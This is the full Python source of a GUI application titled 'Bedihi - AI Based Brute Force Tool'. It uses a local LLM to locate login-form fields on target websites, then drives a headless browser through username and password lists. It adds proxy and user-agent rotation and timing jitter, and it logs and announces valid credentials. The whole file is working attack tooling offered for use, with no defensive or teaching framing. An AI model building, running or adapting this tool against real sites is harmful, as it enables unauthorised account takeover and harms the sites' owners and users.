# -*- coding: utf-8 -*-
import os
import sys
import io
import json
import time
import random
import sqlite3
import threading
import requests
from datetime import datetime
from tkinter import *
from tkinter import ttk, filedialog, messagebox

try:
    from playwright.sync_api import sync_playwright
    _HAS_PLAYWRIGHT = True
except Exception:
    _HAS_PLAYWRIGHT = False

DEFAULT_DB = "local.db"

class BFCore:
    def __init__(self,
                 urls=None, usernames=None, passwords=None,
                 database=DEFAULT_DB,
                 proxy=None,
                 user_agents_file=None,
                 ollama_url="http://localhost:11434",
                 llm_model="llama3.1:8b"):
        self.urls = self._ensure_list(urls)
        self.usernames = self._ensure_list(usernames)
        self.passwords = self._ensure_list(passwords)

        self.database = database or DEFAULT_DB
        self.proxy = proxy or None
        self.user_agents = self._load_user_agents(user_agents_file)
        self.external_ip = None
        self.ollama_url = (ollama_url or "http://localhost:11434").rstrip('/')
        self.llm_model = llm_model or "llama3.1:8b"

        self.delay = 0.0
        self.jitter = 0.0
        self.dom_threshold = 100

        self._captcha_urls = set()

        self._init_db()

    def _ensure_list(self, value):
        if value is None: return []
        if isinstance(value, list): return value
        if isinstance(value, str):
            if os.path.exists(value):
                return self._read_lines_safe(value)
            return [value]
        return [str(value)]

    def _read_lines_safe(self, path):
        try:
            with open(path, "r", encoding="utf-8-sig") as f:
                return [ln.strip() for ln in f if ln.strip()]
        except Exception as e:
            print(f"⚠️  File read error ({path}): {e}")
            return []

    def _load_user_agents(self, path):
        if not path: return []
        return self._read_lines_safe(path)

    def _init_db(self):
        try:
            need_create = not os.path.exists(self.database)
            conn = sqlite3.connect(self.database)
            cur = conn.cursor()
            cur.execute('''CREATE TABLE IF NOT EXISTS form_analysis (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT UNIQUE,
                login_username_selector TEXT,
                login_password_selector TEXT,
                login_submit_button_selector TEXT,
                dom_length TEXT,
                failed_dom_length TEXT,
                dom_change INTEGER,
                test_username_used TEXT,
                success BOOLEAN,
                attempts INTEGER,
                engine TEXT DEFAULT 'playwright',
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )''')
            cur.execute('''CREATE TABLE IF NOT EXISTS brute_force_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                url TEXT,
                username_or_email TEXT,
                password TEXT,
                dom_length TEXT,
                failed_dom_length TEXT,
                success BOOLEAN,
                response_time_ms INTEGER,
                engine TEXT DEFAULT 'playwright',
                proxy_server TEXT,
                external_ip TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )''')
            conn.commit(); conn.close()
            print(f"🗃️  {'Database created' if need_create else 'Database ready'}: {self.database}")
        except Exception as e:
            print(f"❌ DB init error: {e}")

    def call_ollama(self, prompt, system_prompt=None, timeout=300):
        url = f"{self.ollama_url}/api/generate"
        payload = {"model": self.llm_model, "prompt": prompt, "stream": False}
        if system_prompt: payload["system"] = system_prompt
        try:
            r = requests.post(url, json=payload, timeout=timeout)
        except requests.RequestException as e:
            print(f"❌ Ollama connection error: {e}")
            return ""
        if r.status_code != 200:
            print(f"❌ Ollama HTTP {r.status_code}. Body preview: {r.text[:1000]}")
            return ""
        try:
            data = r.json()
        except Exception as e:
            print(f"❌ Ollama JSON parse error: {e} — raw: {r.text[:1000]}")
            return ""
        if isinstance(data, dict):
            for k in ("response", "result", "outputs"):
                if k in data:
                    return data[k] if isinstance(data[k], str) else json.dumps(data[k])
            if "choices" in data and isinstance(data["choices"], list) and data["choices"]:
                first = data["choices"][0]
                if isinstance(first, dict):
                    if "text" in first: return first["text"]
                    if "message" in first and isinstance(first["message"], dict):
                        return first["message"].get("content", "")
            return json.dumps(data)
        return str(data)

    def analyze_login_form(self, url):
        print(f"🔎 Analyzing: {url}")
        if not _HAS_PLAYWRIGHT:
            print("❌ Playwright not installed. `pip install playwright && playwright install`")
            return None
        try:
            from re import findall, DOTALL, IGNORECASE
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                ctx_args = {}
                if self.proxy: ctx_args["proxy"] = {"server": self.proxy}
                if self.user_agents: ctx_args["user_agent"] = random.choice(self.user_agents)
                context = browser.new_context(**ctx_args)
                page = context.new_page()
                page.goto(url, timeout=30000)
                page.wait_for_load_state("networkidle")
                html = page.content()
                clean_len = len(html)

                lower_html = html.lower()
                captcha_indicators = [
                    "captcha", "g-recaptcha", "recaptcha", "h-captcha", "data-sitekey",
                    "turnstile", "cloudflare", "arkose", "cf-turnstile", "recaptcha-api",
                    "recaptchaenterprise", "grecaptcha", "hcaptcha"
                ]
                found_captcha = any(tok in lower_html for tok in captcha_indicators)
                if found_captcha:
                    print(f"⚠️ CAPTCHA detected on {url} during analyze -> skipping this URL.")
                    self._captcha_urls.add(url)
                    res = {
                        "url": url,
                        "login_username_selector": None,
                        "login_password_selector": None,
                        "login_submit_button_selector": None,
                        "dom_length": str(clean_len),
                        "failed_dom_length": None,
                        "dom_change": None,
                        "test_username_used": "captcha",
                        "success": False,
                        "attempts": 0,
                        "engine": "playwright"
                    }
                    self._save_form_analysis(res)
                    try:
                        browser.close()
                    except Exception:
                        pass
                    return res

                inputs = findall(r'<input[^>]+>', html, IGNORECASE)
                buttons = findall(r'<button[^>]*>.*?</button>', html, DOTALL | IGNORECASE)
                forms = findall(r'<form[^>]*>.*?</form>', html, DOTALL | IGNORECASE)
                loginish = [x for x in (inputs + buttons + forms)
                            if any(k in x.lower() for k in ["user","email","pass","login","username"])]

                snippet = "\n".join(loginish)[:12000] if loginish else html[:12000]
                prompt = ("Extract CSS selectors for a login form as JSON with keys:\n"
                          "- login_username_selector\n- login_password_selector\n- login_submit_button_selector\n\n"
                          f"HTML:\n{snippet}\n\nReturn ONLY JSON.")
                sys_prompt = "You are an expert in web automation. Provide precise, unique CSS selectors."
                resp = self.call_ollama(prompt, sys_prompt, timeout=300)

                sel = {}
                if resp:
                    try:
                        sel = json.loads(resp)
                    except Exception:
                        import re
                        m = re.search(r'\{.*\}', resp, re.DOTALL)
                        if m:
                            try: sel = json.loads(m.group(0))
                            except Exception: sel = {}

                valid, details = {}, {}
                def _ok(loc):
                    try: return loc and page.locator(loc).first.count() > 0
                    except Exception: return False

                usr = sel.get("login_username_selector")
                pwd = sel.get("login_password_selector")
                sub = sel.get("login_submit_button_selector")

                if usr and _ok(usr): valid["login_username_selector"] = usr; details["username"]="✅ selector found"
                else: details["username"]="❌ not found"
                if pwd and _ok(pwd):
                    try:
                        t = page.locator(pwd).first.get_attribute("type")
                        if (t or "").lower()=="password":
                            valid["login_password_selector"]=pwd; details["password"]="✅ password input"
                        else:
                            details["password"]=f"❌ wrong type: {t}"
                    except Exception as e:
                        details["password"]=f"❌ error: {e}"
                else: details["password"]="❌ not found"
                if sub and _ok(sub): valid["login_submit_button_selector"]=sub; details["submit"]="✅ clickable element"
                else: details["submit"]="❌ not found"

                for k,v in details.items(): print(f"   {k}: {v}")

                res = {
                    "url": url,
                    "login_username_selector": valid.get("login_username_selector"),
                    "login_password_selector": valid.get("login_password_selector"),
                    "login_submit_button_selector": valid.get("login_submit_button_selector"),
                    "dom_length": str(clean_len),
                    "failed_dom_length": None,
                    "dom_change": None,
                    "test_username_used": None,
                    "success": len(valid)==3,
                    "attempts": 1,
                    "engine": "playwright"
                }
                self._save_form_analysis(res)
                browser.close()
                return res
        except Exception as e:
            print(f"❌ analyze error: {e}")
            return None

    def _save_form_analysis(self, result):
        try:
            conn = sqlite3.connect(self.database); cur = conn.cursor()
            cur.execute('''
                INSERT OR REPLACE INTO form_analysis
                (url, login_username_selector, login_password_selector, login_submit_button_selector,
                 dom_length, failed_dom_length, dom_change, test_username_used, success, attempts, engine)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                result.get("url"),
                result.get("login_username_selector"),
                result.get("login_password_selector"),
                result.get("login_submit_button_selector"),
                result.get("dom_length"),
                result.get("failed_dom_length"),
                result.get("dom_change"),
                result.get("test_username_used"),
                int(bool(result.get("success"))),
                result.get("attempts"),
                result.get("engine","playwright")
            ))
            conn.commit(); conn.close()
        except Exception as e:
            print(f"❌ DB save error: {e}")

    def attack(self):
        print(f"🚀 Attack mode: bruteforce")
        if not self.urls or not self.usernames or not self.passwords:
            print("⚠️  URLs, usernames and passwords must be provided.")
            return
        for url in self.urls:
            if url in self._captcha_urls:
                print(f"⚠️ Skipping {url} — CAPTCHA detected previously.")
                continue

            print(f"🌐 Target: {url}")
            found_success_for_url = False
            for user in self.usernames:
                if found_success_for_url:
                    break
                for pw in self.passwords:
                    res = self._attempt_single(url, user, pw)
                    if res:
                        print("➡️ Success found for this URL — moving to next target URL.")
                        found_success_for_url = True
                        break
                    if self.delay:
                        time.sleep(self._delay_with_jitter())

    def _delay_with_jitter(self):
        return self.delay + (random.uniform(0, self.jitter) if self.jitter>0 else 0.0)

    def _attempt_single(self, url, user, password):
        if url in self._captcha_urls:
            print(f"⚠️ Skipping attempt for {url} — CAPTCHA previously detected.")
            return False

        when = datetime.now().strftime("%H:%M:%S")
        print(f"[{when}] try {user}:{password} @ {url}")

        success_flag = 0
        dom_len = None
        failed_dom_len = None
        resp_time_ms = None

        if not _HAS_PLAYWRIGHT:
            print("⚠️ Playwright not available — skipping live login check. (Install: pip install playwright && playwright install)")
            try:
                conn = sqlite3.connect(self.database); cur = conn.cursor()
                cur.execute('''
                    INSERT INTO brute_force_attempts
                    (url, username_or_email, password, dom_length, failed_dom_length, success,
                     response_time_ms, engine, proxy_server, external_ip)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (url, user, password, dom_len, failed_dom_len, success_flag, resp_time_ms, "playwright", self.proxy, self.external_ip))
                conn.commit(); conn.close()
            except Exception as e:
                print(f"❌ DB attempt save error: {e}")
            return False

        try:
            from re import search
            from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout

            sel_usr = sel_pwd = sel_sub = None
            try:
                conn = sqlite3.connect(self.database); cur = conn.cursor()
                cur.execute("SELECT login_username_selector, login_password_selector, login_submit_button_selector FROM form_analysis WHERE url = ?", (url,))
                row = cur.fetchone()
                conn.close()
                if row:
                    sel_usr, sel_pwd, sel_sub = row
            except Exception:
                sel_usr = sel_pwd = sel_sub = None

            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                ctx_args = {}
                if self.proxy:
                    ctx_args["proxy"] = {"server": self.proxy}
                if self.user_agents:
                    ctx_args["user_agent"] = random.choice(self.user_agents)
                context = browser.new_context(**ctx_args)
                page = context.new_page()

                start = time.time()
                try:
                    page.goto(url, timeout=30000)
                except PWTimeout:
                    print(f"⚠️ Page load timeout for {url}")
                page.wait_for_load_state("networkidle", timeout=30000)
                html_before = page.content()
                dom_len = len(html_before)

                lower_html = html_before.lower()
                captcha_indicators = [
                    "captcha", "g-recaptcha", "recaptcha", "h-captcha", "data-sitekey",
                    "turnstile", "cloudflare", "arkose", "cf-turnstile", "recaptcha-api",
                    "recaptchaenterprise", "grecaptcha", "hcaptcha"
                ]
                if any(tok in lower_html for tok in captcha_indicators):
                    print(f"⚠️ CAPTCHA detected at live attempt on {url} — skipping this URL.")
                    self._captcha_urls.add(url)
                    try:
                        browser.close()
                    except Exception:
                        pass
                    return False

                tried = False
                if sel_usr and sel_pwd:
                    try:
                        el_usr = page.locator(sel_usr).first
                        el_pwd = page.locator(sel_pwd).first
                        if el_usr.count() and el_pwd.count():
                            el_usr.fill(user)
                            el_pwd.fill(password)
                            if sel_sub:
                                try:
                                    page.locator(sel_sub).first.click()
                                except Exception:
                                    page.keyboard.press("Enter")
                            else:
                                page.keyboard.press("Enter")
                            tried = True
                    except Exception:
                        tried = False

                if not tried:
                    common_usr = ["input[name=\"username\"]", "input[name=\"user\"]", "input[name=\"email\"]", "input[id*='user']", "input[type='text']"]
                    common_pwd = ["input[type=\"password\"]", "input[name='password']", "input[id*='pass']"]
                    found = False
                    for u_sel in common_usr:
                        for p_sel in common_pwd:
                            try:
                                if page.locator(u_sel).first.count() and page.locator(p_sel).first.count():
                                    page.locator(u_sel).first.fill(user)
                                    page.locator(p_sel).first.fill(password)
                                    page.keyboard.press("Enter")
                                    found = True
                                    break
                            except Exception:
                                continue
                        if found: break

                try:
                    page.wait_for_load_state("networkidle", timeout=10000)
                except Exception:
                    pass

                end = time.time()
                resp_time_ms = int((end - start) * 1000)
                html_after = page.content()
                after_len = len(html_after)

                if abs(after_len - (dom_len or 0)) > max(50, int(self.dom_threshold or 100)):
                    success_flag = 1
                else:
                    lower = html_after.lower()
                    if any(k in lower for k in ("sign out", "dashboard", "hesabım", "çıkış")):
                        success_flag = 1
                    else:
                        success_flag = 0

                failed_dom_len = dom_len
                dom_len = after_len

                browser.close()

        except Exception as e:
            print(f"❌ Live attempt error for {user}@{url}: {e}")
            success_flag = 0

        try:
            conn = sqlite3.connect(self.database); cur = conn.cursor()
            cur.execute('''
                INSERT INTO brute_force_attempts
                (url, username_or_email, password, dom_length, failed_dom_length, success,
                 response_time_ms, engine, proxy_server, external_ip)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (url, user, password, str(dom_len) if dom_len is not None else None,
                  str(failed_dom_len) if failed_dom_len is not None else None,
                  int(bool(success_flag)), resp_time_ms, "playwright", self.proxy, self.external_ip))
            conn.commit(); conn.close()
        except Exception as e:
            print(f"❌ DB attempt save error: {e}")

        if success_flag:
            print("\n🔥🔥 VALID CREDENTIAL FOUND! 🔥🔥")
            print(f"   Target: {url}")
            print(f"   Username: {user}")
            print(f"   Password: {password}")
            return True

        return False

    def clean_db(self):
        try:
            conn = sqlite3.connect(self.database); cur = conn.cursor()
            cur.execute("DELETE FROM form_analysis")
            cur.execute("DELETE FROM brute_force_attempts")
            cur.execute("DELETE FROM sqlite_sequence WHERE name='form_analysis'")
            cur.execute("DELETE FROM sqlite_sequence WHERE name='brute_force_attempts'")
            conn.commit(); conn.close()
            print("🧹 Database cleaned.")
        except Exception as e:
            print(f"❌ DB clean error: {e}")

APP_TITLE = "Bedihi - AI Based Brute Force Tool"

class TextRedirector(io.TextIOBase):
    def __init__(self, widget): self.widget = widget
    def write(self, s):
        try:
            self.widget.configure(state='normal')
            self.widget.insert(END, s); self.widget.see(END)
            self.widget.configure(state='disabled')
        except Exception:
            sys.__stdout__.write(s)
    def flush(self): pass

class App(Tk):
    def __init__(self):
        super().__init__()
        self.title(APP_TITLE)
        self.minsize(980, 580)

        self.urls_path = StringVar(); self.users_path = StringVar(); self.pass_path = StringVar()
        self.ollama_url = StringVar(value="http://localhost:11434")
        self.llm_model  = StringVar(value="llama3.1:8b")
        self.database   = StringVar(value=DEFAULT_DB)
        self.proxy      = StringVar(value="")
        self.ua_path    = StringVar(value="")

        self.urls_list, self.users_list, self.pass_list = [], [], []

        self._build_ui()
        self._wire_stdout()

    def _wire_stdout(self):
        self.console_redirect = TextRedirector(self.console)
        sys.stdout = self.console_redirect
        sys.stderr = self.console_redirect

    def _build_ui(self):
        self.rowconfigure(0, weight=4)
        self.rowconfigure(1, weight=2)
        self.columnconfigure(0, weight=1)

        top_pane = ttk.Panedwindow(self, orient=HORIZONTAL)
        top_pane.grid(row=0, column=0, sticky="nsew", padx=6, pady=6)

        left = Frame(top_pane); right = Frame(top_pane)
        for f in (left, right):
            f.rowconfigure(0, weight=1); f.columnconfigure(0, weight=1)
        top_pane.add(left, weight=3)
        top_pane.add(right, weight=2)

        col = Frame(left); col.grid(row=0, column=0, sticky="nsew")
        box_urls = LabelFrame(col, text="URLs", padx=6, pady=6)
        box_urls.pack(fill="x")
        Entry(box_urls, textvariable=self.urls_path).pack(side=LEFT, fill="x", expand=True, padx=(0,6))
        Button(box_urls, text="Select URLs File", command=self._pick_urls).pack(side=LEFT)
        self.lb_urls = Listbox(col, height=4, exportselection=False)
        self.lb_urls.pack(fill="both", expand=False, pady=(4,6))

        box_users = LabelFrame(col, text="Users", padx=6, pady=6)
        box_users.pack(fill="both", expand=False)
        self.lb_users = Listbox(box_users, height=6, exportselection=False)
        self.lb_users.pack(fill="both", expand=True)
        Button(box_users, text="Select Users File", command=self._pick_users).pack(fill="x", pady=(6,6))

        box_pass = LabelFrame(col, text="Passwords", padx=6, pady=6)
        box_pass.pack(fill="both", expand=False)
        self.lb_pass = Listbox(box_pass, height=6, exportselection=False)
        self.lb_pass.pack(fill="both", expand=True)
        Button(box_pass, text="Select Pass File", command=self._pick_pass).pack(fill="x", pady=(6,0))

        box_llm = LabelFrame(col, text="Ollama Settings", padx=6, pady=6)
        box_llm.pack(fill="x", pady=(6,0))
        f1 = Frame(box_llm); f1.pack(fill="x")
        Label(f1, text="Ollama URL:").pack(side=LEFT)
        Entry(f1, textvariable=self.ollama_url, width=28).pack(side=LEFT, padx=6)
        Label(f1, text="Model:").pack(side=LEFT)
        Entry(f1, textvariable=self.llm_model, width=18).pack(side=LEFT, padx=6)

        right.rowconfigure(0, weight=1); right.columnconfigure(0, weight=1)
        box_rt = LabelFrame(right, text="Runtime", padx=6, pady=6)
        box_rt.grid(row=0, column=0, sticky="nsew", padx=(0,6))

        r1 = Frame(box_rt); r1.pack(fill="x")
        Label(r1, text="Database:").pack(side=LEFT)
        Entry(r1, textvariable=self.database, width=16).pack(side=LEFT, padx=6)
        Label(r1, text="Proxy:").pack(side=LEFT)
        Entry(r1, textvariable=self.proxy, width=16).pack(side=LEFT, padx=6)

        r2 = Frame(box_rt); r2.pack(fill="x", pady=(6,0))
        Label(r2, text="User-Agents File:").pack(side=LEFT)
        Entry(r2, textvariable=self.ua_path, width=20).pack(side=LEFT, padx=6)
        Button(r2, text="Browse", command=self._pick_ua).pack(side=LEFT, padx=6)

        buttons = Frame(box_rt); buttons.pack(fill="x", pady=(10,0))
        self.run_btn = Button(buttons, text="Run (Analyze → Bruteforce)", command=self._run_pipeline)
        self.run_btn.pack(side=LEFT, expand=True, fill="x", padx=(0,6))
        Button(buttons, text="Clean DB", command=self._run_clean).pack(side=LEFT, expand=True, fill="x", padx=(6,0))

        console_frame = LabelFrame(self, text="Debug / Console", padx=6, pady=6)
        console_frame.grid(row=1, column=0, sticky="nsew", padx=6, pady=(0,6))
        console_frame.rowconfigure(0, weight=1); console_frame.columnconfigure(0, weight=1)
        self.console = Text(console_frame, wrap="word", state='disabled', height=12)
        self.console.grid(row=0, column=0, sticky="nsew")
        yscroll = Scrollbar(console_frame, command=self.console.yview)
        self.console.config(yscrollcommand=yscroll.set)
        yscroll.grid(row=0, column=1, sticky="ns")

    def _pick_urls(self):
        path = filedialog.askopenfilename(title="Select URLs file",
                                          filetypes=[("Text","*.txt *.list *.data"),("All","*.*")])
        if not path: return
        self.urls_path.set(path)
        self.urls_list = self._load_lines(path)
        self.lb_urls.delete(0, END)
        for u in self.urls_list: self.lb_urls.insert(END, u)
        print(f"📄 URLs loaded: {len(self.urls_list)}")

    def _pick_users(self):
        path = filedialog.askopenfilename(title="Select usernames.txt",
                                          filetypes=[("Text","*.txt"),("All","*.*")])
        if not path: return
        self.users_path.set(path)
        self.users_list = self._load_lines(path)
        self._refresh_users_lb()
        print(f"👤 Users loaded: {len(self.users_list)}")

    def _pick_pass(self):
        path = filedialog.askopenfilename(title="Select passwords.txt",
                                          filetypes=[("Text","*.txt"),("All","*.*")])
        if not path: return
        self.pass_path.set(path)
        self.pass_list = self._load_lines(path)
        self._refresh_pass_lb()
        print(f"🔑 Passwords loaded: {len(self.pass_list)}")

    def _pick_ua(self):
        path = filedialog.askopenfilename(title="Select User-Agents file",
                                          filetypes=[("Text","*.txt"),("All","*.*")])
        if not path: return
        self.ua_path.set(path)

    def _load_lines(self, path):
        try:
            with open(path, "r", encoding="utf-8-sig") as f:
                return [ln.strip() for ln in f if ln.strip()]
        except Exception as e:
            messagebox.showerror("Read error", str(e)); return []

    def _refresh_users_lb(self):
        self.lb_users.delete(0, END)
        for u in self.users_list[:5000]: self.lb_users.insert(END, u)

    def _refresh_pass_lb(self):
        self.lb_pass.delete(0, END)
        for p in self.pass_list[:5000]: self.lb_pass.insert(END, p)

    def _collect_engine(self):
        urls = self.urls_list or (self._load_lines(self.urls_path.get()) if self.urls_path.get() else [])
        return BFCore(
            urls=urls,
            usernames=self.users_list,
            passwords=self.pass_list,
            database=self.database.get(),
            proxy=self.proxy.get() or None,
            user_agents_file=self.ua_path.get() or None,
            ollama_url=self.ollama_url.get(),
            llm_model=self.llm_model.get()
        )

    def _run_pipeline(self):
        self.run_btn.config(state='disabled')

        def _task():
            core = self._collect_engine()
            try:
                if not core.urls:
                    print("⚠️  Please load a URLs file first.")
                    return
                if not core.usernames or not core.passwords:
                    print("⚠️  Please load Users and Passwords files.")
                    return

                for i, url in enumerate(core.urls, 1):
                    print(f"\n[{i}/{len(core.urls)}] Analyze → {url}")
                    res = core.analyze_login_form(url)
                    if res is None:
                        print("⚠️  Analyze returned no result (see previous errors).")

                try:
                    print("\n▶️ Starting attack phase (bruteforce)…")
                    core.attack()
                    print("\n✅ Pipeline completed.")
                except Exception as e:
                    print(f"❌ Attack error: {e}")
            finally:
                try:
                    self.after(0, lambda: self.run_btn.config(state='normal'))
                except Exception:
                    pass

        threading.Thread(target=_task, daemon=True).start()

    def _run_clean(self):
        def _task():
            core = self._collect_engine()
            core.clean_db()
        threading.Thread(target=_task, daemon=True).start()

if __name__ == "__main__":
    try:
        App().mainloop()
    except Exception as e:
        print(f"❌ Fatal GUI error: {e}")
